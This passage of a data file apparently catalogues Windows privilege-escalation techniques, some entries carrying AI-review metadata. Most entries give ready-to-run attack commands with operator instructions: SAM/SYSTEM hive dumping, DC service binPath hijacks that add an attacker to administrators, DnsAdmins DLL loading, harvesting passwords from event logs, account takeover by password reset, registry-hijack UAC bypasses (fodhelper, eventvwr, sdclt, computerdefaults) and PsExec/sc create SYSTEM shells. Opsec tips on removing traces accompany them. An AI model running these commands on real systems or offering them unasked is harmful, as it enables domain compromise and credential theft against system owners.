      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions if the privilege is held (very rarely granted).",
        "commands": [
          {
            "code": ":: build and run a SeTcb LsaLogonUser PoC (gtworek PsBits)",
            "label": "No off-the-shelf one-liner: requires custom code calling LsaLogonUser to make and impersonate a token",
            "lang": "cmd"
          }
        ],
        "description": "SeTcbPrivilege corresponds to Act as part of the operating system. Microsoft's archived policy reference describes low-level authentication services as the typical users of this right. A Windows access token represents user identity, groups and privileges separately; a privilege assignment should not be used as an account name.",
        "id": "pe-setcb",
        "label": "SeTcb",
        "mitre": {
          "id": "T1134.003",
          "url": "https://attack.mitre.org/techniques/T1134/003/"
        },
        "opsec": "Rarely granted; abnormal LSA logon calls are detectable.",
        "phase": "hold",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft — Act as part of the operating system (archived policy reference)",
            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system"
          },
          {
            "kind": "primary",
            "label": "Microsoft — Access Tokens",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          },
          {
            "label": "Priv2Admin, Windows privilege abuse",
            "url": "https://github.com/gtworek/Priv2Admin"
          }
        ],
        "requires": [
          "SeTcbPrivilege in the token"
        ],
        "summary": "Understand the right associated with trusted authentication services.",
        "tools": [
          {
            "name": "gtworek PsBits (VirtualAccounts / TcbElevation)",
            "url": "https://github.com/gtworek/PSBits"
          }
        ]
      },
      "claims": [
        {
          "text": "The archived Microsoft policy reference identifies low-level authentication services as the typical users of SeTcbPrivilege.",
          "section": "Microsoft — Act as part of the operating system (archived policy reference) — Reference",
          "sources": [
            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system"
          ]
        },
        {
          "text": "A Windows access token records user identity, group membership and privileges as distinct information.",
          "section": "Microsoft — Access Tokens — Access token contents",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-serelabel",
    "label": "SeRelabel",
    "phase": "hold",
    "summary": "Understand mandatory integrity labels and their modification.",
    "affects": "All supported Windows versions if held (almost never granted); needs a High-integrity context.",
    "description": "SeRelabelPrivilege concerns modification of an object's integrity label. Mandatory Integrity Control is a Windows access-control mechanism that operates in addition to discretionary access-control lists. An integrity label and an object's discretionary permissions are separate security properties.",
    "mitre": {
      "id": "T1134",
      "url": "https://attack.mitre.org/techniques/T1134/"
    },
    "references": [
      {
        "label": "Microsoft — Modify an object label (archived policy reference)",
        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/modify-an-object-label",
        "kind": "primary"
      },
      {
        "label": "Microsoft — Mandatory Integrity Control",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control",
        "kind": "primary"
      },
      {
        "label": "Decoder, Abusing the SeRelabelPrivilege",
        "url": "https://decoder.cloud/2024/05/30/abusing-the-serelabelprivilege/"
      }
    ],
    "requires": [
      "SeRelabelPrivilege",
      "High-integrity context"
    ],
    "opsec": "A serious misconfiguration if a standard user holds it; taking ownership of a SYSTEM process is a strong detection.",
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions if held (almost never granted); needs a High-integrity context.",
        "description": "SeRelabelPrivilege concerns modification of an object's integrity label. Mandatory Integrity Control is a Windows access-control mechanism that operates in addition to discretionary access-control lists. An integrity label and an object's discretionary permissions are separate security properties.",
        "id": "pe-serelabel",
        "label": "SeRelabel",
        "mitre": {
          "id": "T1134",
          "url": "https://attack.mitre.org/techniques/T1134/"
        },
        "opsec": "A serious misconfiguration if a standard user holds it; taking ownership of a SYSTEM process is a strong detection.",
        "phase": "hold",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft — Modify an object label (archived policy reference)",
            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/modify-an-object-label"
          },
          {
            "kind": "primary",
            "label": "Microsoft — Mandatory Integrity Control",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control"
          },
          {
            "label": "Decoder, Abusing the SeRelabelPrivilege",
            "url": "https://decoder.cloud/2024/05/30/abusing-the-serelabelprivilege/"
          }
        ],
        "requires": [
          "SeRelabelPrivilege",
          "High-integrity context"
        ],
        "summary": "Understand mandatory integrity labels and their modification."
      },
      "claims": [
        {
          "text": "SeRelabelPrivilege corresponds to modifying an object's integrity label.",
          "section": "Microsoft — Modify an object label (archived policy reference) — Reference",
          "sources": [
            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/modify-an-object-label"
          ]
        },
        {
          "text": "Windows Mandatory Integrity Control provides access control in addition to discretionary access-control lists.",
          "section": "Microsoft — Mandatory Integrity Control — Opening definition",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control"
          ]
        }
      ]
    }
  },

  // ── Local Group Membership (whoami /groups) ─────────────────────────────────
  {
    id: 'pe-backup-operators',
    label: 'Backup Operators',
    phase: 'hold',
    summary: 'Group grants SeBackup/SeRestore for reading SAM/NTDS.',
    affects: 'All supported Windows / Server versions.',
    description: r`Members of the Backup Operators group are granted SeBackupPrivilege and SeRestorePrivilege. Enable them in your token, then read the protected SAM/SYSTEM hives locally and dump the local hashes offline, converging on the same SeBackup/SeRestore tradecraft (the ntds.dit-on-a-DC path is covered under SeBackup/SeRestore).`,
    tools: [{ name: 'impacket-secretsdump', url: 'https://github.com/fortra/impacket' }],
    commands: [
      { label: 'Confirm group membership', code: r`whoami /groups | findstr /i "Backup"`, lang: 'cmd' },
      { label: 'Save hives (SeBackup)', code: r`reg save HKLM\SAM C:\Temp\sam.hive & reg save HKLM\SYSTEM C:\Temp\system.hive`, lang: 'cmd' },
    ],
    mitre: mitre('T1003.002'),
    references: [{ label: 'mpgn, BackupOperatorToDA', url: 'https://github.com/mpgn/BackupOperatorToDA' }, { label: 'PentestLab, Backup Operator', url: 'https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/' }],
    requires: ['Membership in Backup Operators', 'Privilege present in the token but may need explicit enabling; on interactive logon with UAC/AAM the token can be filtered, so obtain a non-filtered token (e.g. WinRM) or run in an elevated context'],
    opsec: 'The privileges are not enabled by default in a non-elevated token. Same detection profile as SeBackup/SeRestore.',
  },
  {
    id: 'pe-server-operators',
    label: 'Server Operators',
    phase: 'hold',
    summary: 'Reconfigure a DC service binPath to run as SYSTEM.',
    affects: 'All supported Windows Server versions (Domain Controllers).',
    description: r`On Domain Controllers, the Server Operators group can manage services. Reconfigure a SYSTEM service binPath to your command and restart it to execute as SYSTEM on the DC, directly compromising the domain.`,
    tools: [{ name: 'sc (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config' }],
    commands: [
      { label: 'Hijack a service binPath (on a DC this grants BUILTIN\\Administrators = domain-admin-equivalent)', code: r`sc config <svc> binpath= "cmd /c net localgroup administrators <YOUR-DOMAIN-USER> /add"`, lang: 'cmd' },
      { label: 'Trigger (net.exe is not a service binary, so the start returns error 1053; the command already ran as SYSTEM, this is expected)', code: r`sc stop <svc> & sc start <svc>`, lang: 'cmd' },
    ],
    mitre: mitre('T1543.003'),
    references: [{ label: 'HackingArticles, Server Operator Group', url: 'https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/' }],
    requires: ['Membership in Server Operators (on a DC)', 'Ability to start/stop a target service'],
    opsec: 'sc config + service restart on a DC is high-signal. Restore the original binPath afterward.',
  },
  {
    id: 'pe-dnsadmins',
    label: 'DnsAdmins',
    phase: 'hold',
    summary: 'Load a DnsPlugin DLL into the SYSTEM DNS service.',
    affects: 'All supported Windows Server versions running the DNS role.',
    description: r`Members of DnsAdmins can set the ServerLevelPluginDll value via dnscmd, pointing the DNS service at a plugin DLL with no path validation. Restarting the DNS service (often on a DC, running as SYSTEM) loads your DLL as SYSTEM. The DLL must be a real DNS plugin: it has to export DnsPluginInitialize / DnsPluginQuery / DnsPluginCleanup (returning 0) and run the payload in a new thread, or dns.exe fails to start and the session dies. A plain msfvenom DLL lacks these exports; use mimilib.dll or a custom DnsPlugin DLL. Highly disruptive: the DNS service may crash.`,
    tools: [
      { name: 'dnscmd (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd' },
      { name: 'mimilib.dll (mimikatz)', url: 'https://github.com/gentilkiwi/mimikatz' },
    ],
    commands: [
      { label: 'Point DNS at a DnsPlugin DLL', code: r`dnscmd.exe /config /serverlevelplugindll C:\Temp\mimilib.dll`, lang: 'cmd' },
      { label: 'Restart DNS to load it (DnsAdmins-native trigger)', code: r`dnscmd <server> /restart`, lang: 'cmd' },
      { label: 'sc.exe restart (only if you hold service-control / local-admin rights)', code: r`sc.exe stop dns && sc.exe start dns`, lang: 'cmd' },
    ],
    mitre: mitre('T1543.003'),
    references: [
      { label: 'Shay Ber, Feature not bug: DNSAdmin to DC compromise in one line', url: 'https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83' },
      { label: 'labofapenetrationtester, Abusing DNSAdmins', url: 'https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html' },
    ],
    requires: ['Membership in DnsAdmins', 'Permission to restart the DNS service'],
    opsec: 'ServerLevelPluginDll write under DNS\\Parameters and DNS.exe spawning a child are strong detections. Disruptive to AD DNS.',
  },
  {
    id: 'pe-hyperv-admins',
    label: 'Hyper-V Administrators',
    phase: 'hold',
    summary: 'Redirect vmms.exe (SYSTEM) file ops via a hardlink to escalate.',
    affects: 'Hosts where Hyper-V Administrators can drive vmms.exe storage operations. The vmms DACL-grant primitive is a by-design won\'t-fix (Microsoft ruled the group is not a security boundary), so it works wherever the group exists; what is version-gated is the follow-on file-write-to-SYSTEM chain, which later builds mitigate.',
    versions: [...range('win10-1607', 'win10-1809'), 'srv2016', 'srv2019'],
    description: r`Hyper-V Administrators can make vmms.exe, which runs as SYSTEM, perform file operations on paths they otherwise cannot touch. During VM deletion vmms.exe resets the .vhdx permissions with an unimpersonated SetSecurity as SYSTEM; a hardlink redirects that permission-reset so you are granted a full-control DACL over an existing protected file. From there, chain a file-write-to-SYSTEM technique to execute. A hardlink/TOCTOU file-operation abuse of the service, not one specific CVE.`,
    mitre: mitre('T1068'),
    references: [{ label: 'decoder.cloud, From Hyper-V Admin to SYSTEM', url: 'https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/' }],
    requires: ['Membership in Hyper-V Administrators', 'A file-write-to-SYSTEM chain (e.g. CVE-2018-0952 / CVE-2019-0841 / DiagHub) available on the target build'],
    opsec: 'The vmms DACL grant is by-design and works everywhere the group exists; you still rely on winning a file-operation race against vmms.exe and on a write-to-SYSTEM step that later builds mitigate.',
  },
  {
    id: 'pe-print-operators',
    label: 'Print Operators',
    phase: 'hold',
    summary: 'Group holds SeLoadDriverPrivilege; load vulnerable driver.',
    affects: 'Group right is version-independent, but since Windows 10 1803 NtLoadDriver forbids driver-config registry references under HKEY_CURRENT_USER (exactly what the vanilla EoPLoadDriver flow creates), so the plain technique fails by default on 1803+ and needs a bypass. On modern builds the follow-on driver load is further limited by HVCI / driver blocklist, and drivers other than the deny-listed Capcom.sys are required.',
    description: r`On a domain controller, the Print Operators group is granted SeLoadDriverPrivilege by default (to install printer drivers); this is not a workstation/member-server default, where "Load and unload device drivers" is assigned to Administrators only and BUILTIN\Print Operators is a DC-scoped, effectively-empty group. Where held, it is the precondition for the SeLoadDriver → BYOVD path: load a known-vulnerable signed driver and exploit it for kernel-mode code execution as SYSTEM.`,
    tools: [{ name: 'EoPLoadDriver', url: 'https://github.com/TarlogicSecurity/EoPLoadDriver' }],
    commands: [
      { label: 'Confirm group + privilege', code: r`whoami /groups | findstr /i Print
whoami /priv | findstr /i SeLoadDriver`, lang: 'cmd' },
    ],
    mitre: mitre('T1068'),
    references: [
      { label: 'Tarlogic, Abusing SeLoadDriverPrivilege for privilege escalation', url: 'https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/' },
      { label: 'Tarlogic, EoPLoadDriver (SeLoadDriverPrivilege abuse)', url: 'https://github.com/TarlogicSecurity/EoPLoadDriver' },
    ],
    requires: ['Membership in Print Operators (grants SeLoadDriverPrivilege)'],
    opsec: 'Same as the SeLoadDriver path: driver-load events and the driver blocklist / HVCI may block it.',
  },
  {
    id: 'pe-event-log-readers',
    label: 'Event Log Readers',
    phase: 'hold',
    summary: 'Read Security / PowerShell logs for leaked credentials.',
    affects: 'All supported Windows / Server versions (depends on logging configuration).',
    description: r`Membership in Event Log Readers grants read access to the restricted Security event log; the PowerShell-Operational log is separately readable by any interactive user by default, so it is worth checking even without the group. Where process-creation auditing AND the "Include command line in process creation events" policy, or PowerShell script-block / module logging, are enabled, those logs frequently contain credentials passed on command lines or embedded in scripts. Harvest them and reuse the account.`,
    tools: [{ name: 'wevtutil (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil' }],
    commands: [
      { label: 'Search the Security log for passwords', code: r`wevtutil qe Security /f:text /rd:true /c:200 | findstr /i "password pass"`, lang: 'cmd' },
    ],
    mitre: mitre('T1552'),
    references: [{ label: 'OSCP/CPTS Notes, Event Log Readers', url: 'https://notes.dollarboysushil.com/windows-privilege-escalation/group-privileges/event-log-readers' }],
    requires: ['Membership in Event Log Readers', 'Credentials actually present in logged events'],
    opsec: 'Read-only and quiet; success depends entirely on whether logging captured a secret.',
  },
  {
    id: 'pe-account-operators',
    label: 'Account Operators',
    phase: 'hold',
    summary: 'Take over non-protected accounts; log on to DCs.',
    description: r`On a domain controller, Account Operators can create and modify users and groups that are NOT AdminSDHolder-protected (Domain Admins, the Operators groups, etc. are off-limits), and may log on locally to DCs. The path is indirect: reset the password of, or add yourself to, a delegated non-protected account or group that holds privileges (a custom admin group, an account with DCSync/GPO rights), then use those, rather than joining a protected group directly.`,
    tools: [{ name: 'net (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-user' }],
    commands: [
      { label: 'Reset a non-protected user\'s password', code: r`net user <user> <NewPass> /domain`, lang: 'cmd' },
      { label: 'Add yourself to a delegated non-protected group', code: r`net group "<Group>" <you> /add /domain`, lang: 'cmd' },
      { label: 'ADModule equivalents', code: r`Set-ADAccountPassword -Identity <user> -Reset -NewPassword (ConvertTo-SecureString "<NewPass>" -AsPlainText -Force)
Add-ADGroupMember -Identity "<Group>" -Members <you>`, lang: 'powershell' },
    ],
    mitre: mitre('T1098'),
    references: [{ label: 'kayssel, Account/Backup Operators & Event Log Readers', url: 'https://www.kayssel.com/post/interesting-groups-ad/' }],
    requires: ['Membership in Account Operators', 'A privileged NON-protected account or group to take over'],
    opsec: 'Password resets and group changes (Event ID 4724/4728/4732) are high-fidelity, and this is a domain-level change.',
    affects: 'All supported Windows Server versions (Active Directory).',
  },
  {
    "id": "pe-admins-filtered",
    "label": "Administrators (Filtered Token)",
    "phase": "hold",
    "summary": "Understand deny-only group SIDs and the UAC token model.",
    "affects": "All supported Windows versions with UAC enabled.",
    "description": "A deny-only group SID participates in access-denied checks but does not grant access through access-allowed entries. Its presence in a token therefore does not confer that group's allowed permissions. In UAC Admin Approval Mode, an administrator's standard and administrative tokens are distinct; elevation uses the administrative token. Account membership and the current process token need to be described separately.",
    "mitre": {
      "id": "T1548.002",
      "url": "https://attack.mitre.org/techniques/T1548/002/"
    },
    "requires": [
      "Membership in local Administrators with a UAC-filtered token"
    ],
    "opsec": "No action by itself; it routes to the UAC-bypass / admin-to-SYSTEM techniques.",
    "references": [
      {
        "label": "Microsoft, SID Attributes in an Access Token",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-attributes-in-an-access-token",
        "section": "SE_GROUP_USE_FOR_DENY_ONLY",
        "kind": "primary"
      },
      {
        "label": "Microsoft, How User Account Control works",
        "url": "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works",
        "section": "Sign in process; The UAC user experience",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in the identity, permissions, and audit-policy explanation. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions with UAC enabled.",
        "description": "A deny-only group SID participates in access-denied checks but does not grant access through access-allowed entries. Its presence in a token therefore does not confer that group's allowed permissions. In UAC Admin Approval Mode, an administrator's standard and administrative tokens are distinct; elevation uses the administrative token. Account membership and the current process token need to be described separately.",
        "id": "pe-admins-filtered",
        "label": "Administrators (Filtered Token)",
        "mitre": {
          "id": "T1548.002",
          "url": "https://attack.mitre.org/techniques/T1548/002/"
        },
        "opsec": "No action by itself; it routes to the UAC-bypass / admin-to-SYSTEM techniques.",
        "phase": "hold",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, SID Attributes in an Access Token",
            "section": "SE_GROUP_USE_FOR_DENY_ONLY",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-attributes-in-an-access-token"
          },
          {
            "kind": "primary",
            "label": "Microsoft, How User Account Control works",
            "section": "Sign in process; The UAC user experience",
            "url": "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works"
          }
        ],
        "requires": [
          "Membership in local Administrators with a UAC-filtered token"
        ],
        "summary": "Understand deny-only group SIDs and the UAC token model."
      },
      "claims": [
        {
          "text": "A deny-only SID is considered for access-denied entries and ignored for access-allowed entries.",
          "section": "Microsoft, SID Attributes in an Access Token — SE_GROUP_USE_FOR_DENY_ONLY",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-attributes-in-an-access-token"
          ]
        },
        {
          "text": "The UAC model uses separate standard and administrative access tokens for an administrator in Admin Approval Mode.",
          "section": "Microsoft, How User Account Control works — Sign in process; The UAC user experience",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works"
          ]
        }
      ]
    }
  },

  // ── UAC Bypass (medium → high integrity) ────────────────────────────────────
  {
    id: 'pe-uac-fodhelper',
    label: 'Fodhelper',
    phase: 'admin',
    summary: 'Auto-elevate fodhelper via an HKCU ms-settings handler.',
    affects: 'Windows 10 (all builds) and Windows 11 through 24H2, plus Server 2016 and later. Unpatched per UACME (method 33, works from build 10240); the most reliable registry-handler UAC bypass.',
    versions: [...range('win10-1507', 'win11-24h2'), 'srv2016', 'srv2019', 'srv2022', 'srv2025'],
    description: r`fodhelper.exe auto-elevates and reads HKCU\Software\Classes\ms-settings\shell\open\command (with DelegateExecute). Plant your command there and run fodhelper to execute at High integrity with no UAC prompt. Elevates an existing admin to High integrity; it does not turn a standard user into admin.`,
    tools: [{ name: 'UACMe', url: 'https://github.com/hfiref0x/UACME' }],
    commands: [
      { label: 'Set the hijack key', code: r`reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f`, lang: 'cmd' },
      { label: 'Trigger elevation', code: r`fodhelper.exe`, lang: 'cmd' },
      { label: 'Clean up the signatured key afterward', code: r`reg delete "HKCU\Software\Classes\ms-settings" /f`, lang: 'cmd' },
    ],
    mitre: mitre('T1548.002'),
    references: [
      { label: 'winscripting.blog, First entry: Welcome and fileless UAC bypass', url: 'https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/' },
      { label: 'PentestLab, UAC Bypass Fodhelper', url: 'https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/' },
    ],
    requires: ['Member of local Administrators running at Medium integrity (default UAC)'],
    opsec: 'The HKCU ms-settings shell-open-command key + fodhelper spawning cmd is a widely-signatured detection. Clean up the key afterward.',
  },
  {
    id: 'pe-uac-eventvwr',
    label: 'Event Viewer (eventvwr)',
    phase: 'admin',
    summary: 'Hijack the mscfile handler eventvwr.exe auto-elevates.',
    affects: 'Legacy: Windows 7 – Windows 10 1607. Patched in the Creators Update (1703); does NOT work on modern builds.',
    versions: [...range('win7', 'win10-1607'), 'srv2008', 'srv2012', 'srv2016'],
    description: r`eventvwr.exe is an auto-elevating Microsoft-signed binary that opens its .msc snap-in via the HKCU\Software\Classes\mscfile\shell\open\command handler, which is checked before the HKCR (system-wide) one and never validated. A medium-integrity admin can point that key at an arbitrary command; launching eventvwr.exe then runs it at High integrity with no UAC prompt (default UAC level; not "Always Notify").`,
    tools: [{ name: 'UACMe', url: 'https://github.com/hfiref0x/UACME' }],
    commands: [
      { label: 'Set the hijack key', code: r`reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "cmd.exe" /f`, lang: 'cmd' },
      { label: 'Trigger elevation', code: r`eventvwr.exe`, lang: 'cmd' },
    ],
    mitre: mitre('T1548.002'),
    references: [{ label: 'enigma0x3, Fileless UAC Bypass via eventvwr', url: 'https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/' }],
    requires: ['Member of local Administrators running at Medium integrity (default UAC)'],
    opsec: 'The HKCU mscfile shell-open-command key + eventvwr.exe spawning cmd is a classic, widely-signatured detection. Remove the key afterward.',
  },
  {
    id: 'pe-uac-sdclt',
    label: 'Sdclt',
    phase: 'admin',
    summary: 'Auto-elevating sdclt via the Folder/App Path handler.',
    affects: 'Legacy: Windows 10 1507 to 1607. The Folder-command variant taught here was hardened around 1709 (RS3); it does NOT work on modern builds.',
    versions: range('win10-1507', 'win10-1709'),
    description: r`sdclt.exe (Backup and Restore) auto-elevates and, on Windows 10, spawns control.exe, which resolves its open command through HKCU\Software\Classes\Folder\shell\open\command. Plant your command in that key and launch sdclt to run at High integrity with no prompt. (A separate sdclt variant instead hijacks HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe; it does not use the Folder key.)`,
    tools: [{ name: 'UACMe', url: 'https://github.com/hfiref0x/UACME' }],
    commands: [
      { label: 'Set the hijack key', code: r`reg add "HKCU\Software\Classes\Folder\shell\open\command" /ve /t REG_SZ /d "cmd.exe" /f
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f`, lang: 'cmd' },
      { label: 'Trigger', code: r`sdclt.exe`, lang: 'cmd' },
    ],
    mitre: mitre('T1548.002'),
    references: [{ label: '0x1, Another sdclt UAC bypass (Folder\\shell\\open\\command variant)', url: 'https://0x1.gitlab.io/exploit/Another-sdclt-UAC-bypass/' }, { label: 'PentestLab, UAC Bypass Sdclt', url: 'https://pentestlab.blog/2017/06/09/uac-bypass-sdclt/' }],
    requires: ['Member of local Administrators at Medium integrity'],
    opsec: 'HKCU Folder/command key + sdclt spawning cmd is signatured. Clean up afterward.',
  },
  {
    id: 'pe-uac-computerdefaults',
    label: 'ComputerDefaults',
    phase: 'admin',
    summary: 'Auto-elevating computerdefaults via ms-settings handler.',
    affects: 'Windows 10 1803 and later, Windows 11, and Server 2019 and later. Same ms-settings handler as fodhelper, but per UACME (method 62) the ComputerDefaults variant only works from build 1803, so Server 2016 is not affected.',
    versions: [...range('win10-1803', 'win11-24h2'), 'srv2019', 'srv2022', 'srv2025'],
    description: r`computerdefaults.exe auto-elevates and, like fodhelper, launches its target through the HKCU\Software\Classes\ms-settings\shell\open\command handler. Point that key at your command and run computerdefaults to execute at High integrity without a consent prompt.`,
    tools: [{ name: 'UACMe', url: 'https://github.com/hfiref0x/UACME' }],
    commands: [
      { label: 'Set the hijack key', code: r`reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f`, lang: 'cmd' },
      { label: 'Trigger', code: r`computerdefaults.exe`, lang: 'cmd' },
    ],
    mitre: mitre('T1548.002'),
    references: [
      { label: 'winscripting.blog, First entry: Welcome and fileless UAC bypass (ms-settings handler origin)', url: 'https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/' },
      { label: 'MITRE T1548.002, Bypass UAC', url: 'https://attack.mitre.org/techniques/T1548/002/' },
    ],
    requires: ['Member of local Administrators at Medium integrity'],
    opsec: 'Shares the fodhelper ms-settings IOC; clean up the key.',
  },
  {
    id: 'pe-uac-cmstp',
    label: 'CMSTPLUA / ICMLuaUtil',
    phase: 'admin',
    summary: 'Auto-elevate via the CMSTP elevated COM interface.',
    affects: 'Windows 7 to Windows 11; the primitive is unfixed but the technique is heavily detected by default EDR/Sigma rules.',
    description: r`This bypass abuses an auto-elevating COM object, the ICMLuaUtil "Elevated COM Interface" (CLSID {3E5FC7F9-9A51-4367-9063-A120244FBEC7}), to run a command as a High-integrity process. Implemented by UACMe method 41 and several public scripts; needs no file on disk.`,
    tools: [{ name: 'UACMe', url: 'https://github.com/hfiref0x/UACME' }],
    mitre: mitre('T1548.002'),
    references: [
      { label: 'Oddvar Moe (api0cradle), UAC bypass using CMSTPLUA COM interface', url: 'https://gist.github.com/api0cradle/d4aaef39db0d845627d819b2b6b30512' },
      { label: 'MITRE T1548.002, Bypass User Account Control', url: 'https://attack.mitre.org/techniques/T1548/002/' },
    ],
    requires: ['Member of local Administrators at Medium integrity'],
    opsec: 'The signal is a high-integrity process spawned by dllhost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7} (the CMSTPLUA COM surrogate), plus abnormal ICMLuaUtil::ShellExec calls; this method does not run cmstp.exe. Heavily covered by public Sigma/Elastic rules.',
  },
  {
    id: 'pe-uac-silentcleanup',
    label: 'SilentCleanup Task',
    phase: 'admin',
    summary: 'Abuse the auto-elevating SilentCleanup scheduled task.',
    affects: 'Windows 8.1 to Windows 11 (this environment-variable-expansion variant is documented from Windows 8.1, not plain Windows 8). On Server it only applies to installs with the Desktop Experience (GUI) feature, where cleanmgr.exe is present; it does not work out-of-the-box on Server Core, where cleanmgr.exe is absent by default.',
    versions: [...range('win8', 'win11-24h2'), 'srv2012', 'srv2016', 'srv2019', 'srv2022', 'srv2025'],
    description: r`The built-in SilentCleanup scheduled task runs "with highest privileges" yet is launchable by normal users. The task's action path (%windir%\system32\cleanmgr.exe) is expanded from the user-controlled environment block, so redirecting windir in HKCU\Environment makes the elevated task launch your binary instead.`,
    tools: [{ name: 'UACMe', url: 'https://github.com/hfiref0x/UACME' }],
    commands: [
      { label: 'Run the task', code: r`schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" /i`, lang: 'cmd' },
    ],
    mitre: mitre('T1548.002'),
    references: [{ label: "Tyranid's Lair, Exploiting Environment Variables in Scheduled Tasks", url: 'https://www.tiraniddo.dev/2017/05/exploiting-environment-variables-in.html' }],
    requires: ['Member of local Administrators at Medium integrity'],
    opsec: 'Environment-variable hijack in HKCU plus an elevated task spawning an odd child is detectable.',
  },

  // ── Admin → SYSTEM (high integrity → SYSTEM) ────────────────────────────────
  {
    id: 'pe-admin-service-system',
    label: 'SYSTEM Service (PsExec / sc create)',
    phase: 'admin',
    summary: 'Admin creates a service the SCM runs as SYSTEM.',
    affects: 'All supported Windows versions.',
    description: r`A high-integrity administrator can register a Windows service whose binary the Service Control Manager launches as LocalSystem. Do it by hand with sc create, or let PsExec -s spin up a transient service and hand back a SYSTEM shell. (RunasCs does not create a service; it launches a process under another account when you hold suitable credentials or a token, which is the token/credential-impersonation lane.) The default administrator-to-SYSTEM step.`,
    tools: [
      { name: 'PsExec (Sysinternals)', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/psexec' },
      { name: 'RunasCs', url: 'https://github.com/antonioCoco/RunasCs' },
    ],
    commands: [
      { label: 'PsExec SYSTEM shell', code: r`PsExec64.exe -accepteula -s -i cmd.exe`, lang: 'cmd' },
      { label: 'Manual service as SYSTEM', code: r`sc create svc binPath= "cmd /c C:\Temp\payload.exe" & sc start svc`, lang: 'cmd' },
    ],
    mitre: mitre('T1543.003'),
    references: [{ label: 'RunasCs', url: 'https://github.com/antonioCoco/RunasCs' }],
    requires: ['High-integrity administrator context'],
    opsec: 'Service creation (Event ID 7045) and PsExec named pipes are classic detections.',
  },
  {
    "id": "pe-admin-schtask-system",
    "label": "Scheduled Task as SYSTEM",
    "phase": "admin",
    "summary": "Understand LocalSystem as a scheduled task's execution identity.",
    "affects": "All supported Windows versions.",
    "description": "A scheduled task has a security context associated with an account or group. LocalSystem is one Windows account identity, with extensive privileges on the local computer, and is separate from a logged-on user's account. The task's configured identity describes its execution context; the Task Scheduler label alone does not identify that account.",
    "tools": [
      {
        "name": "schtasks (built-in)",
        "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks"
      }
    ],
